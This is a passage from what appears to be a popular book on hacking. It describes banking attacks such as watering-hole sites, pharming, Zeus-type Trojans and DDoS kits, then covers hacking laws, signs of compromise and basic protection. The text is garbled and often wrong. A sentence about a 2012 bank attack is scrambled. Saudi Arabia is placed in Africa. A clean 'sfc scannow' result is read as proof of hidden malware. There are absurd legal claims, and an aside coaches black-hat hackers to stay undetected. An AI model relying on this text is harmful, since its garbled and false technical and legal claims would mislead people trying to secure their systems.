wait for target people to visit the hacked website and they are not inviting their victims to do it, they are only waiting for  them  to  visit  the  website.  If  you  choose  this  method,  you  should  use Internet Explorer and Adobe Flash Player. Hackers are compromising websites using this method that aren’t updated and  configured  very  frequent  because  they  are  easily  to  hack  than  an updated website, usually hackers are using the exploit kits they find on the black square. Pro hackers hack the website at least six months before they attack it. This method is very efficient because hackers and websites can be located very hard comparatively to phishing attacks. After the attacks hackers keep in  touch  with  the  website  to  make  sure  that  everything  is  going  in  the direction they want to. In  2012,  hackers  used  in Massachusetts. The operation was successful due to the JavaScript elements  to  hack  a  regional  bank   this  method    on both sites, the bank in Massachusetts and the local government that was under Washington DC suburbs: Hxxp:  www.xxxxxxxxtrust.com Hxxp:  xxxxxxcountrymd.gov Another  attack  using  this  method  was  discovered  in  March  2013  when many  banks  in  South  Korea  were  compromised,  the  hackers  collected sensitive data from the bank and they have also shut down their system. An interruption of their services was made on their online banking. Hackers  consider  this  method  a  solution  for  the  problems  that  authorities and security services and systems give them, and because they love to solve problems, they found an innovative solution in this case as well. Researches  show  that  most  of  the  hackers  make  money  online  using  this method and a lot of them are still undetected. Hackers have a lot of ideas and they are really good, their ideas reflect in their solutions and that’s how Pharming and Credit Card Redirection hack method was born. This method consists in hijacking a bank’s URL and when the customers access it they are automatically guided to another site which is identical to the  original  website.  This  method  of  hacking  is  a  little  bit  more  difficult than the other two methods, but not impossible. You can technically make it with one of the next techniques: 1. DNS Cache Poisoning  DNS’s exist in a bank’s, organization’s or company’s network to make a better response performance. Hackers attack the DNS server by exploring vulnerabilities in the DNS software, which make the server to give an error because it will incorrectly validate the DNS response. The server will redirect people to another site because it will catch wrong all the entries. Usually, the server which will host the victims is managed and controlled by hackers in order to give the customers   malware. Hackers can even attack customers if they provide the hackers their IP.  1. Hosts File Modification  Hosts file is used by hackers to direct the customers on any website under their control.  A new technique is Credit card redirection which is used on disgraceful e- commerce  websites  to  let  the  hackers  get  the  sensitive  information  they need. This technique is not hacking the customer directly, after the victim pays using  the  card,  the  hacker  modify  the  flow  of  the  operation  and  all  the money are redirected to them and most of the attacks are made on websites that offer e-commerce services. Hackers  also  break  into  a  victim’s  account  by  changing  the  credit  card processing file. Another type of attacks used in online banking hacking is called Malware based attacks and they are classified as the most dangerous attacks on the internet related to online banking services. There are many malicious categories but in general they are designed to hit  the online financial business.   Security community considers Zeus, Carberp and Spyeye are considered the most dangerous of all. Zeus is in fact a Trojan horse which best works on all the versions of Windows, it was first discovered in 2007 when hackers use it  to  obtain  illegally  information  about  US  Department  of  Transportation, it’s  the  oldest  one  from  those  three  and  even  NASA  got  hacked  in  2009 using Zeus. MIITB  is  maybe  the  most  efficient  method  used  by  hackers  in  internet banking  where  the  ones  who  want  to  attack  combine  social  engineering with malware which is infecting the browser of the victim. It mostly hide under  the  form  of  BHO   Browser  Helper  Object ,  attacks  are  based  on proxies which infect the browser of the customer exploring it’s weakness on the victim’s device. Malicious codes are able to change the content of an online transaction between the bank and the customer.   The  Zeus  Trojan  is  also  used  to  hack  and  get  bank  credentials  by  MIIT keystroke  logging.  Specialists  consider  that  nine  million  phishing  emails with Zeus were sent in 2009. According  to  ZeusTracker  USA,  Deutschland,  Russia,  UK,  Ukraine, Romania,  Netherlands,  France,  Japan  and  Turkey  are  top  ten  countries which are hosting Zeus. HoT-  Hand  on  Thief  is  another  Trojan  specially  designed  to  hack  online banking,  it  was  created  to  hit  the  Linux  and  Mac  systems  which demonstrated to be immune to malware. Authorities say that it was created in Russia and it’s available to buy on some Russian underground forums, it’s capable of infecting the victims and stealing sensitive information from their machines. Grabbers and backdoor infection vectors are currently on sale with Hand of Thief for approximately $3000. DDoS  attacks  are  also  used  to  hack  internet  banking.  In  case  of  online banking  hacking,  hackers  are  helped  by  volunteers  that  participate  in  the operation, a botnet is easier to detect and volunteers can block the whole process of detecting. After 129 countries have been attacked with DDoS attacks, FBI decides to share  a  list  of  more  than  130.000  Internet  Protocol  addresses  used  in attacks, attacks where the victims could not access their online or mobile banking services. The fundamental types of DDoS attacks: The ones based on volume VBA- the hacker is making an inundation with big quantity of data on the site. Protocol  Attacks  PA-  when  the  hackers  are  trying  to  imbue  the  target servers by exploiting network protocol failures. Layer Seven Attacks- created to exhaust the resource limits when hackers make  inundations  with  huge  amounts  of  HTTP  requests  that  saturate  a target’s resources. DDoS attacks are also used as a deflection to hide the results of an attack that is ongoing. Dirt Jumper is a part of DDoS malware group and it has an   updated version called Pandora, a big number of DDoS kits have shown up like  YZF,  ArmageddoN  and  DiWar.  FBI  and  FS-ISAC  and  IC3  are highlighting the distribution of Dirt Jumper kit being used in bank attacks. Using  the  methods  from  above,  hackers  can  get  money  and  they  are  also called  criminal  cyber  if  they  do  this  activity  illegally,  they  can  hack  an ultimate number of account and banks until they are discovered, if they are ever discovered. Now more than ever, hackers don’t focus only on computers, they also take in consideration hacking the mobile phones which are today such an result of great ideas combined with hard work, since the phones are smart phones they allow you to do any kind of operation you want or need and they are way more used nowadays than computers, a lot of people use their smart phone to pay bills online or to do transactions online via internet banking services all around the world and that’s why hackers are focusing also on smart phones and hacking their systems in order to reach a new goal or just to give themselves new challenges. A research done in 2015 highlights the importance of smart phones and shows us that smart phones are more used nowadays then computers.     CHAPTER 4: HACKING AND NON-HACKING  Hackers and the Law  Everything in this life has its own limits and consequences, you can’t eat without stopping and getting fat, you can’t drive your car without stopping and giving her fuel, you can’t jump free from a plane without a parachute and  not  getting  hurt  and  you  can’t  hack  forever  except  if  you  are  doing ethical hacking. But do you know how far you should go?! The main problem is that government agents aren’t making the difference between the two types of hackers, so if you are basically curious to test your skills on a system you can win up to twenty years in prison just like black hat hackers who are spying on the internet, hacking important systems and have evil goals. Or worst than that, there will be no difference between you and a person who has killed or abused other members of the society. In  general,  governments  aren’t  paying  too  much  attention  for  hackers,  a nightmare  for  the  government  is  represented  by  smart  hackers  who  could not  be  detected  and  do  it  just  for  amusement  and  because  they  are passionate,  so  if  you  are  a  black  hat  hacker  you  should  have  intelligence and  speed  reaction  in  order  to  stay  under  cover  forever.  Government carelessness about those who help them sometimes improve their systems is brightly  reflecting  in  the  laws  that  government  is  imputing  no  matter  in which  country  on  the  globe.  Let’s  take  as  an  example  United  States  of America because they are at the moment the biggest political, economical and social power in the world. In United States of America there are many laws that are banning hacking just like 18 U.S.C. § 1029 which focuses on creation, division and use of codes and machines that give hacker illegal access to a computer system. The  language  of  the  law  is  incomplete  and  unfair  because  it  is  making reference only to creating and using a machine with a bad intention, but it does not make any specification about testing, learning and understanding systems.   If we take a closer look to the laws, we can also find another interesting law in U.S Department of Justice which is 18 U.S.C. § 1030, this law is banning unauthorized access to government machines. The law is considered broken even if the hacker only entered the system without doing anything else. There is a big range of penalties going from big considerable fins to years to spend in the jail. Officials consider that minor hacking actions deserve punishment  starting  with  six  months  while  bigger  actions  of  hacking  and attacks  can  take  up  to  twenty  years  in  prison,  they  mainly  focus  on  the damages made by the hacker but does not anyone think about the money spent on the hacker’s life in prison? Let’s analyze another country, let’s take as an example a European country like  Germany   Deutschland   which  has  similar  laws  in  comparison  with USA. There is a law in Germany that is banning even possession of hacking tools and even if you never open or use them, once you are discovered you can’t  escape.  The  nation  is  complaining  about  this  law  because  many applications fall under the definition of hacking tools and it is an infraction under  this  law  if  organizations  or  companies  hire  some  hackers  to  check their system weakness and flaws. Believe it or not, Germany has adopted a new law in 2007 which is going way too far because even if you go in a computer stole and ask the seller to give  you  a  computer  because  you  want  to  start  hacking  even  if  you  are kidding  you  will  get  arrested  if  officials  hear  about  your  joke,  more  than that, if the you will buy the computer from the seller he will be arrested too, don’t joke too much if you go to Germany, you never know when you could be considered wrong. Traveling  to  Africa,  the  situation  is  a  little  bit  more  different,  in  Saudi Arabia for example it’s considered a law deviation if you have a false name in  a  hacking  operation  according  to  Article  4  of  their  Basic  Law  of Governance.  Another  law  going  too  far  in  the  same  country  is  about assisting  to  such  an  operation  and  not  telling  the  officials  about  the operation; even if you are watching your friend how he is testing a system and you aren’t telling the officials about it it’s considered a cyber crime. Taking a look at the situation in Asia, laws are a little bit too permissive in China  and  maybe  that’s  why  they  are  in  the  first  place  at  hacking  in  the   world  but  official  sources  say  that  the  situation  will  change  in  the  future because  the  government  is  taking  care  of  this  problem  and  they  are formulating new measures for hacking and its adepts. Top Ten countries in hacking puts United States on the second place after China, followed by Turkey, Russian Federation, Taiwan, Brazil , Romania, India, Italy and Hungary. Before  deciding  to  test  systems,  make  sure  you  have  fully  read  and  understood  all  the  laws  about  hacking  in  your  country,  be  careful  all  the  time about what are you saying and to whom you are saying.   Legality offers you as a gift your freedom, this gift is very precious and it is even more precious than your passion because those two things go hand by hand, you cannot take full advantage of your passion in prison where most likely if you’re a hacker they will ban access to a computer in your case. Give a special attention to the laws, because even if you think that they are very  unfair  you  cannot  avoid  them  and  in  the  end  you  are  under  your country’s  laws  so  please  make  sure  you  will  not  break  them.  Hacking operations are a sensible subject for every country and the big problem in the  world  is  that  people  who  make  the  laws  are  not  in  knowledge  of everything about a domain and that’s why sometimes we are supposed to respect laws that are making no sense.  How do Hackers Affect Our Lives  According to Newton’s Third Law, for every action there is an equal and opposite reaction and this is just so true. Everything we make has an effect but sometimes we do not notice the effect or even realize there is going to be an effect, but some of us simply ignore the effects of their actions. Hacking  has  its  effects  too  as  any  other  action;  there  are  effects  on individuals, organizations and on society in general. Let’s see the effects on every level starting with the effects of hacking on an organization.  It  depends  of  course  on  the  hacker’s  goal  but  generally hacking is big companies and organizations worst enemies because they can cause huge damages into their economy.   For  example,  in  2003-2004  United  Kingdom  has  paid  due  to  computer hacking billions of pounds in order to solve their problems. A BBC article relates  that  viruses  designed  by  hackers  made  a  damage  of  $55  billion around  the  world  in  2003  in  businesses  domain.  In  2011,  Sony  has  paid from  its  pocket  around  $170  million  because  they  have  got  their  Play Station hacked in a single shot, at the same time Google has paid around a half  million  dollars  due  to  “middle  sized”  hacking  operations.  Richard Power says that due one hacking session companies and organizations can pay up to seven million dollar in one single day. Despite  the  financial  side,  there  is  an  effect  on  the  organizations  and companies information; most of the hackers search instead of cash money some valuable information such as plans, researches, strategies and reports. Online databases can be a hacker’s goal as well as reports, they might want to  obtain  addresses,  phone  numbers  or  emails,  such  an  attack  on  a  small company would cost them more than the company itself. Some  hackers  try  to  affect  the  organizational  structure  of  a  company  by modifying it or stealing from it the elements they want to but this kind of attack is really difficult to realize because most of the companies employ specialized  IT  teams  that  are  always  working  on  updating,  creating  and civilizing security systems to prevent hacking. Hacking affects also the computer and technology industry but the industry may take benefit from hacking if they know how to redirect the situation in their favor. Private companies which are specializing on creating security systems may use hacking as a key to their success. More than that, companies prefer prevention not cure so they might invest huge  quantities  of  money  on  security  systems  and  why  not  hardware because  there  are  hacks  which  can  be  possible  only  modifying  the hardware. Once we know the effects on this level, we can move to another level which will be hacking effects on society. Only an example of hacking can get society crazy and make its members spend  big  money  on  better  software,  which  is  not  a  bad  thing  because  a   better software means always a better life. Hacking is causing money loss here as well because society members aren’t always good informed about malware and what could malware do so they are  happy  when  they  receive  an  email  that  is  promising  them  millions  of dollars  if  they  gave  their  personal  information.  Social  engineering  is affecting this category in a very intense mode because malware and social engineering  are  like  the  relationship  between  your  hands  and  your  eyes when you are crying; you always remove your tears with your hands. So,  hackers  are  responsible  both  for  excellent  and  awful  effects  on  the society. As an effect of White Hat hackers we own basics such as the Free Software Foundation that have finished it possible for computer adepts to exercise, learn, copy, adjust, and reorganize computer programs without paying for it. Grey Hat hackers have also had helpful impacts on society by running to find  vulnerabilities  in  traditional  software  products  with  the  intentions  of notifying the creators and designers so they can secure the troubles before a Black Hat hacker can come along and develop the error. The society got affected in 2002 when a cyberterrror movement was started by a group of hackers named El8 against a white hackers group known as  Project  Mayhem.  The  campaign’s  goal  was  causing  a  chaos  around  the  globe by destroying the infrastructure of security systems manufacturing.   This  is  not  everything,  there  is  one  more  effect  and  that  effect  is  on individuals. Hackers can loose everything starting from their life funds and transform their financial situation by bringing it underground. As a hacker you have to work with people and invest a lot of time in this by listening to everyone’s problems and trying to solve them, the problem is not this, the problem  is  that  people  do  not  understand  what  you  are  trying  to  explain because few people have a base in hacking and explaining the situation to them can bring your nerves down. Another effect gained by hackers is the financial  one,  only  passionate  hackers  make  viruses  and  discover  new techniques to hack for free, the rest are using hacking as a machine to get money because they get information and sell it later or they can create and send viruses specially for money.   Also, by hacking they can risk their freedom and that’s the worst thing from all the above. In  each  case,  hacking  affect  badly  reputation,  it  affects  the  hacker’s reputation, the organization’s reputation and the society’s reputation as well and that’s how hacking can damage effectively the reputation and usually the most affected are the big companies and organizations because if they are hacked a few times in a short time they can lose up to 50% from their customers. Hacking also has an impact on the computers and it can affect computers in two  ways:  affecting  the  software  and  affecting  the  hardware,  both  can  be destroyed  if  the  hacker  is  skilled  and  the  could  be  never  brought  back  in some cases, but in other cases the damage is not too big and owners can use it again after the hack.  How to Know if You’re Hacked  Each one of us can be a victim of someone’s hack, the first step in saving yourself is knowing that you are hacked and after that go to a specialist to make sure that your problem exist and to find a solution as fast as possible. But how do you know you have been hacked? The first part: Observe the marks of a possible hack by following the next steps: Who  knows  your  computer  better  than  you  do?  No  one,  so  please  take  a close general look and spot if there is something that goes wrong such as your  computer  speed,  files  loss,  the  computer  is  not  recognizing  your password  and  you  cannot  open  programs,  surprise!  Some  programs  you didn’t install, it’s connecting to the internet automatically even if you did not activate this option, files have suffered changes and if you have a printer it way act strangely. The  next  step  is  going  online  see  if  you  can  access  all  the  websites  with your password and if you can then that is a good sign but if when you go online your searches are redirected to another pages sites and if there will born new extra browser screens then I don’t have the best news for you. You  can  turn  suspicious  and  get  worried  if  there  are  multiple  toolbars  on your browser, this is an important sign that you have been hacked also if   your  antivirus  software  is  not  working  and  if  you  receive  fake  virus messages you might be hacked. Visible signs of hacking are some bills you get without purchasing anything and check your sent section in the email to see if there are some emails sent except the ones you sent, sometimes the fake  emails  do  not  appear  on  the  victim’s  screen  but  to  make  sure  call  a friend and ask for the last email send by you or any strange email received from you. Google  yourself!  This  helps  a  lot  in  finding  out  if  you  are  hacked,  see  if there are any too personal information that you have not made public. Hackers  usually  fully  control  your  machine  if  they  want,  so  if  things  are going crazy and the situation is no more under your control then you are manipulated by another person 100%. The  second  part:  what  you  must  do  if  you  recognized  any  signs  of  the above First of all, throw away your internet connection and disconnect as fast as you can because in this way if there is someone controlling your computer they will immediately lose the conection with you, don’t forget to plug out the router too. So,  right  now  you  are  fully  under  mission  and  you  should  pay  more attention  from  now  on,  to  continue  start  up  your  computer  and  boot  it  in safe mode make sure it is disconnected completely and use safe mode from your computer to reopen it. After  that,  take  a  close  look  and  check  for  any  new  programs  like  anti- spayware or anti-virus and it’s recommended to check if your programs and files refuse to open. If you are finding new strange programs you did not install,  uninstall  it  but  if  you  do  not  know  how  call  a  computer  center service and bring a specialist uninstall the programs for you. The next step you  should  follow  is  scanning  your  computer,  do  a  sweep  using  an  anti- virus like Avira, AVG or Avast and don’t forget to request help if you are unsure about this. If the test ends up with nothing please back up the files you  consider  important  and  after  that  do  a  complete  system  restore  and make sure you get the latest updates.   If  you  have  been  an  online  banking  hacking  victim,  take  your  phone  and alert  the  bank!  Contact  them  to  explain  the  situation  and  to  store  your accounts, a good idea is to request some advices for the future about funds protection. And the last step is to alert all the people that have your email and let them know about your problem but do not give too personal details, make sure you  clearly  explain  what  is  hiding  behind  the  emails  from  you  and  make them delete the email and to not follow any links or suspicious material, ask them  if  they  already  did  it  and  if  they  did  it  help  them  protect  their computer and act in the way you just acted in your case, let’s give help if we can. Some  people  live  their  whole  life  without  knowing  they  are  hacked,  and most of them do not even care about this aspect because they are not giving their devices attention and they really do not care about them only if they can hit them, which is very possible to happen because most of them put important and personal stuff on their machine such as business documents, personal photos, personal videos and sensitive data in general which they want to keep private but once they are hacked all those data can be shared with the public. Remember that everything could get hacked; this is the main reason why we should invest in quality software and pay a special kind of attention to all of our devices, if anything is going strange with your device even if it is a printer, computer, phone or tablet please take the right attitude and if you do not know how to do the steps from above, take your device to the closest center that offers support to devices which work electronically, it is better to pay a sum of money than losing everything. The method presented will not take you too long to save your computer’s life but, in the end, every person is free to build their life as they want by choosing what they want. Do not let other control your life by controlling your computer, even if the hacked computer works pretty good you should to your best in order to lose connection with your hacker. Some hackers use professional and sophisticated systems and if they want to infect something, in most of the cases they will make the hack look like it is a part of your system. Sophisticated systems allow hackers use the best   malware that embeds itself in the hacked system and the hacked system will not be able to detect it or even to remove it. If hackers get more professional, you must do it and this book is going to present another method, a little bit more complicated that will help you to know  if  you  are  hacked  or  not,  and  if  you  are  giving  you  a  solution  is  a must  to  do.  Hackers  who  prefer  sophisticated  methods  to  hack  want  to create a botnet which is a network of compromised machines managed by them; a botnet can have only a command center. To get rid of this kind of hacks, kindly follow the next steps: Make sure you have a good quality anti-virus, anti-malware software which can detect all kinds of viruses and malware like Trojans, worms, keyloggers and  rootkits,  because  there  are  coming  up  everyday  new  versions  of malware and they might not be recognized, but try to get the latest versions of anti-virus and anti-malware because it is better. So, run your anti-virus software and start doing active sessions of scanning. Next, see what is going on with your Task Manager, it is the first thing you  have  to  check  if  you  are  suspicious  about  being  hacked.  Instead  of  the  classic  method     Typing  Task  Manager  in  the  search  line  of  your  Start  button     to  open  it,  you  can  try  something  faster  with  your  keyboard  by  beating Ctrl+Alt+Del at once and selecting Task Manager at the end of the  menu that shows up. After you open Task Manager select by clicking the  option “Processes” and a window is supposed to show up, check your CPU  Usage at the bottom of the window and if the CPU is too high something is  going on your machine without your permission. In general, on clean and uninfected machines CPU Usage is under 10%. Move  to  the  next  step  in  order  to  continue  the  process  and  check  your system’s  integrity  in  Windows  because  once  you  know  that  there  is something on your system you should try to identify it as well. Microsoft has built a system integrity checker into Windows known as sfc.exe which must be able to test the integrity of the files in your system and it helps you a lot in scanning for corruptions. A command prompt is essential so please open one if you have not yet, after your  right-clicking  select  Run  as  Administrator  and  write  the  command    sfc scannow   and the system will welcome you with something like:   Microsoft Windows  [Version 6.1.7601] Copyright   2009 Microsoft Corporation.All rights reserved. C:\Windows\system32>sfc  scannow   Beginning system scan. This process will take some time.   Beginning verification phase of system scan. Verification 100% complete.     Windows Resource Protection did not find any integrity violations. C:\windows\system32> And if it is displaying something like the above means that the system is infected with a hidden malware. After  that,  test  Network  Connections  using  Netstat  because  hackers  are communicating with your computer via internet connections, Windows has an utility called Netstat and it is specially designed to make you able see all the connections on the machine, you will need again a command prompt so open it and use the command   Netstat- ano  . Some of the malicious family can’t be detected with Netstat but you should try  it  because  some  versions  are  detectable  and  you  never  know  what  is under your possession. Install  Wireshark  program  which  can  help  you  in  checking  the  internet connections which is a utility that identifies everything that is getting in and out the computer. It is less possible to be controlled by the malware because compared to Netstat this is not a Windows tool. After you install it open it and let it spot all the packets that are traveling in and out your system. Hackers use high number ports when they are manipulating so search for ports between 1500 and 60000. It will appear on one of those ports if you have  malicious  stuff  in  your  computer,  checking  traffic  that  leave  your system is also a good idea. To see the traffic from your system create a filter    in Wireshark  by writing it in the filter menu, type this after ip.src == PUT  YOUR IP HERE.  The filter created is going to show you traffic only from your system and that’s  why  your  IP  is  requested.  Write  into  your  filter’s  window  this ip.src== PUT YOUR IP HERE and if the syntax is right it should switch from pink to green. After  this  please  click  on  Apply  button  and  look  for  unusual  traffic   the malicious  one   and  if  you  detect  something  unusual  please  contact  a specialist in order to help you as fast as you can do it, malicious files are so hard to find because hackers all over the world create new versions almost every  hour  while  viruses  are  not  that  easy  to  make  and  this  is  the  main reason  why  malicious  family  hits  more  often  than  ever,  because  it  is  so diverse. Systems as Linux and OS are even more complicated and you need to be a master in the domain in order to discover that they are infected with something  but  the  main  advantage  with  those  systems  is  that  they  are immune to most types of attacks, but not to all types. *NOTE: this method itself is a challenge, if you choose this method please be  patient  and  careful,  do  everything  with  a  maximum  of  attention  and check your traffic list more than once to make sure you will detect if there are any of the malicious family members captive in your system. Even if this  method  is  a  little  bit  harder  than  the  other  one  presented  it  is  very efficient and worth to try.  How to protect Yourself From Hacking  Prevention  is  literally  always  better  than  cure,  it  is  better  to  avoid  an unwanted situation and everyone can do it with a little bit of attention and it might  request  an  investment,  but  always  remember  that  cure  prices  are higher  than  investments.  Why  not  keep  your  body  healthy  by  making  an investment in some vitamins instead of getting ill and pay a lot of money, physical and psychical effort? You can avoid a lot of things. Protecting your computer from all types of hacking is very important for you and for your system  but  few  are  those  who  know  how  to  do  it  and  their  number  is decreasing …   A  high  number  of  attacks  make  the  internet  to  look  like  it  is  holding  a horror movie story nowadays due to the big numbers of cyber criminals and their  attacks,  keeping  your  device  healthy  is  crucial  in  the  battle  against hacking. Parents are advising you because they want you to be happy, this book has the same task. Make  sure  that  your  computer  is  not  a  magnet  to  hackers  due  to  its vulnerabilities  and  always  check  on  new  updates  and  install  them,  don’t wait too much because hackers are always ready. The first things you should take attitude and protect your computer from are viruses;  there  are  several  ways  to  categorize  viruses  and  each  one  comes with its own names. There are macroviruses, worms, backdoors and Trojans are the best known and experienced at the moment. These viruses multiply over  the  internet  and  malicious  websites  or  other  sources  to  infect  the computer.  Others  spread  though  devices  that  are  allowing  you  to  write information and reading in such as USB memory sticks and external hard drives. Viruses have three main functions: infect, destroy or damage data on your  machine  together  with  information  on  external  drivers.  Hackers  can also use your computer as a hacking machine by infecting it with viruses but  luckily  there  are  many  tools  that  help  you  keep  the  situation  under control. Anti-virus  software  highly  respected  and  appreciated  by  experts  is  Avast which has a regular set of updates and it is easy to use due to its design. Some useful tips below to increase your AV’s yield:  Install only a software. Make sure your AV software updates automatically, this will take worries away. Ensure that your software accepts updates. Check your computer’s situation at least once a week. Make sure that the software is always running.  How to avoid infections?   Be very careful about what files you choose to open and download from the internet,  it  is  recommended  to  delete  immediately  files  from  unknown people or organizations after you receive them. Risks are at every step, so take them in consideration before you burn a CD or run a USB stick into your  computer.  Make  sure  again  that  your  AV  software  is  running  before you insert them. Virus creators do not usually target free and open source software and you can avoid some infections by switching to this kind of software. Spyware is another thing you should be aware of. Spyware is belonging to malicious software family and it is used by hackers to track your work and to  allow  them  get  the  information  they  want  from  you.  This  software  is capable of recording your mouse movements; collect the words you write, the pages you enter and the programs that belong to you. As an effect of the previous  actions,  hackers  can  break  your  security  and  gain  personal  data about you and in some cases about your contacts as well. Machines become infected  with  spyware  in  the  same  way  they  get  infected  with  viruses. Review your browser’s settings and make sure they are secure. Anti-Spyware  tools  are  very  welcomed  to  protect  your  computer  and Spybot is what you need because it is capable of identifying and removing known types of malware. Prevent this type of infections by following the next steps:  Read everything that shows up in your face carefully before clicking ok or yes. Never accept to run content from unbelievable sources.  Getting  a  firewall  is  also  important  because  it  is  the  first  program  that knows  the  incoming  information  from  the  internet  and  the  last  one  to control  outgoing  data  as  well.  With  a  firewall  you  do  not  have  to  pay attention  to  the  incoming  and  outgoing  information  is  not  important anymore. A high quality firewall will ask for your permission for each program on your machine. When one of your programs is trying to contact the outside  world your firewall will alert you and ask you if you trust it. In this war    between  hackers  and  non  hackers  such  a  firewall  could  be  used  as  your  front of defense.   To avoid untrusted network connections you should:  Install on your machine only the programs you need and download them right with their license. Do not give your passwords to anyone. If you do not need an internet connection please disconnect your machine. Shut down your computer at night. Ensure that all the computers which belong to your network have a firewall. Get an easy-to-use firewall.  Keeping your computer up-to-date is very important for your security, you should  update  everything  on  your  computer  starting  from  your  operating system  and  ending  with  the  programs  you  use.  Updates  are  required regularly on every software. Also,  stay  up-to-date  with  FOSS   FREE  AND  OPEN  SOURCE SOFTWARE  and freeware tools. Try out them to any propriety software used by you; pay extra attention to unlicensed programs. These tools are built by experts who belong to non-profit organizations or companies which update them frequently free of charge. Numerous FREE AND OPEN SOURCE SOFTWARE  FOSS  applications may  be  similar  to  each  other  and  work  in  the  same  way  only  with  small differences. Studies  provide  that  getting  away  from  the  Microsoft  Office  operating system and moving to FFOS alternative named GNU Linux is more secure and it is healthier for your computer. And remember, prevention is better than cure! Those  are  not  the  only  ways  to  prevent  attacks;  life  is  full  of  options  at every point of it so protection is as well full of options at every point.   In order to increase your system’s security you can follow the next advices but keep in your mind that everything is possible and that there is not any hardware or software which is impossible to hack. A strong password is one of the first steps you should make in following your road to protection because it helps on securing your information. It is recommended to repeat combinations of random alpha-numeric characters such  as  numbers,  symbols  and  letters  that  will  be  more  than  eleven characters. To reduce the risk, please use a password manager. Even if your password is one of the most secured in the world do not forget to pay extra amount of attention to the websites you visit. Two-Factor Authentication is very important and they have a positive effect on you. Websites and companies which respect their customers and services will provide such an option. Let’s take as an example Twitter, if you have a twitter account and you try to log in from an unknown device, after typing the password they send you a message on your phone with a verification code you should enter in order to access your twitter account. Such options alert  the  users  exactly  when  someone  tries  to  get  into  their  account.  This option is used also by Apple, Microsoft, Google and Dropbox. To get full advantage of this option set up your settings carefully. Never back up sensitive information on your phone using the internet, just ordinary  activities  and  nothing  more  than  that.  Keep  sensitive  documents and  images  of  all  external  servers  which  mean  you  will  not  allow applications  like  iCloud  or  Flickr  and  others  to  automatically  upload information to their storage. And to resolve this problem create an external drive which you will only access  when  you  are  not  connected  to  the  internet  and  keep  the  sensitive data there. Also, you should not link accounts because hackers can take full advantage of  this  action  and  compromise  everything  that  belongs  to  you  by  proxy. Nowadays, it is really to keep accounts far from each other due to social media which had a strong impact on society. Check which applications you have linked in the past with your social media accounts and remove them if you are not using them.   Choosing  a  hard-to-guess  security  question  might  save  you  from  being  a hacking victim as well, but in the century of social media websites where every  person  is  sharing  everything  is  not  making  sense  for  them,  but  for those who are a little bit mysterious and keep their personal details away from people might be a solution. Even if you are extroverted and you share everything about you, answering with stupidity might increase your security level. Don’t forget to protect all your devices with passwords. It is a must to do when you get a new device such as a phone or tablet, you should secure it with  a  good  password.  Changing  your  passwords  often  is  also  an  idea  to take in consideration due to the daily discoveries of the hackers. By giving importance to your devices you also give importance to the contacts that are “stuck in” there. If  you  have  a  domain  name  you  can  choose  to  privatize  your  website because once you have a domain name there are big chances to access your data  without  effort.  Privatize  your  domain  registration  by  going  to  the usually used domain registration site, log in and search for the option that allows you to privatize your data and if this option seems to be hard to find or  inexistent  please  contact  the  site  and  let  them  guide  you  though  the procedure. This option might request fees but it is definitely worth it. Clearing your browser data is also an action you should often do and not only on your computer, on all the devices which are under your possession. Browsers keep everything about your online activity and collect records of every site you have visited, data such as what you download or send can be stocked  for  weeks  and  the  hackers  take  full  advantage  of  this  by  stealing your records of online activity. Try to avoid public computers because hackers use them to challenge their selves often and you should keep out of their game. Using    “hyper-text  transfer  protocol  secure.”  –  HTTPS,  it  is  similar  to  HHTTP which people use to enter internet addresses. HTTPS is giving you  an extra level of security and encryption when you are using the internet,  the  data  is  also  validate  which  means  that  HTTPS  can  show  you  if  the  website is either fake or original.    Free Wireless access is nice and helpful, but check twice the connection you choose  because  free  Wi-Fi  is  the  easiest  way  to  hack  something,  hackers can  get  everything  from  your  device  if  they  are  connected  to  the  same network as you do. Be  careful  which  connections  you  choose,  some  hackers  specially  make  ones  for  their  future  victims,  if  you  really  need  free  Wi-Fi  more  than  anything then make sure you are connecting to a serious source.   Updates  are  good  to  have  and  very  welcomed  in  your  life  and  on  your systems,  the  world  is  changing  second  by  second  and  there  is  something new that shows up second by second, of course you can not see and take full benefit of everything that goes on in the both virtual and real worlds but you can try at least to keep in touch with innovation by trying every thing new that fronts you. If updates were not as important as they are, maybe this would have a huge impact on individuals, organizations and on societies. Updates are the real proof  which  indicates  that  there  are  bright  minds  that  think  for  everyone and find a solution for every problem. By  following  the  advices  and  methods  given  you  will  be  in  a  process  of mind growing with a high level of security guaranteed by the methods and advices.        CHAPTER 5: ADVANTAGES AND DISADVANTAGES OF BEING A HACKER Despite that every action has a reaction, every action has advantages and disadvantages.  If  you  decide  to  do  an  action  you  should  assume  both success  and  failure  and  both  advantages  and  disadvantages.  There  is  no perfection  in  the  world  so  it  is  impossible  to  find  anything  that  has  only advantages  or  something  that  has  only  disadvantages  because  anything should have a balance. If you are an ethical hacker you should take full advantage of the situations you  are  in  because  you  have  to  tailor  different  solutions  for  different problems, you can not have a standard set of action so you will create a plan for every hack and your plan should contain the next equipment:  1. Give details about testing intervals 2. Give details about testing processes 3. Identify all the networks that you should test 4. Get the plane approved because you are working with people.  And if your plan is successful you should be very proud of yourself because you  will  save  and  protect  a  big  number  of  people  including  your  friends, family and in general everyone you love, you should be proud that you are giving a hand in building your country’s security! Another benefit if you are passionate about hacking and you really love what to do is being paid for it and getting your freedom guaranteed. Also, other categories of persons take advantage more than hackers if we talked about ethical hacking because ethical hackers are fighting constantly with terrorism and the attacks which attempt to the national security. The advantages and disadvantages problem has two big answers: if you see hacking  advantages  and  disadvantages  from  the  hacker’s  angle  or  if  you look at the advantages and disadvantages from the public option angle. The main idea is that what is an advantage for a hacker is a disadvantage seen from the other angle of the public opinion and it works vice versa.   So, we remain under the ethical hacking example and if an ethical hacker is not  paid  at  time,  he  could  send  you  some  malicious  file  or  he  can  do  an attack because he is skilled in order to get money and you as a company or organization are disadvantaged. Hackers know all your system’s flaws and vulnerabilities  and  they  can  use  it  to  destroy  you.  On  the  other  part,  if everything  goes  on  as  it  is  supposed  to;  you  will  take  advantage  from ethical  hacking  because  your  system  will  be  more  immune  to  attacks. Another disadvantage for your company or organization is that the hacker knows all your financial data and I do not think it will end up good for you if you make them mad … And if your hacker is making a mistake your company is always paying for his mistake but you are the ones who have hired him. And now let’s move from the particular example to a general one, hackers are very advantaged because they have the chance to test their abilities and they also learn how to work independently while for a company this is a disadvantage especially if it is a big company, it could turn anytime into the testing or hacking area if the hackers want to. A  disadvantage  for  you  as  a  hacker  is  if  anyone  else  know  about  your activity because being if you are not in ethical hacking then you have big chances to get a free trip to the jail and maybe a sentence, while the people you  know  can  play  on  you  however  they  want  because  they  know  about your “hidden” activities, so as a hacker 